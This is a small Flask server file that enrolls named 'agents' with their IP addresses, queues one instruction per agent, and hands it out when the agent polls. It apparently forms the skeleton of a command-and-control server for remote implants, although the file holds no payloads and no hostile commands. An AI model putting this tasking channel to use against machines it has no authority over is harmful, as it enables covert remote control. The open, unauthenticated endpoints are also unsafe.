from flask import Flask, request, json
import json

app = Flask(__name__)

instructionsDic = {}

@app.route('/agents')
def agents():
    with open('agentsList.json', 'r') as agents:
        agentsDic = json.load(agents)
    return agentsDic

@app.route('/enroll/<name>')
def enroll(name):
    with open('agentsList.json', 'r+') as agents:
        existing = json.load(agents)
        existing[name] = str(request.remote_addr)
        agents.seek(0)
        json.dump(existing, agents)
        agents.truncate()
    instructionsDic[name]=""
    return '', 200

@app.route('/instruction/<name>')
def instructions(name):
    todo=instructionsDic[name]
    instructionsDic[name] = ""
    return todo, 200

@app.route('/addInstruction/<name>/<instruction>')
def addInstructions(name, instruction):
    instructionsDic[name]=instruction
    return instructionsDic

if __name__ == '__main__':
	app.run(debug=True)
 